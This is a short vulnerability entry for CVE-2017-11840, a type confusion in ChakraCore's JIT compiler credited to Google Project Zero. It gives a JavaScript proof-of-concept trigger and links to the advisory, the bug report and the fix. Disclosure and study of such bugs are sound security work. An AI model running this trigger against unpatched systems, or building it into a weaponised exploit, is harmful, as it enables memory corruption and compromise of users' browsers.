# CVE-2017-11840

- Fix: Nov 2017
- Credit: lokihardt of Google Project Zero

## PoC

```javascript
function opt() {
    let obj = [2.3023e-320];
    for (let i = 0; i < 1; i++) {
        obj.x = 1;  // In the first analysis, BailOnNotObject emitted
        obj = +obj;  // Change the type
        obj.x = 1;  // Type confusion
    }
}

function main() {
    for (let i = 0; i < 1000; i++) {
        opt();
    }
}

main();
```

## Reference

- [Microsoft](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-11840)
- [Google Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1365)
- [Fix](https://github.com/Microsoft/ChakraCore/commit/874551dd00ff6f404e593c7e0162efb54b953f5a)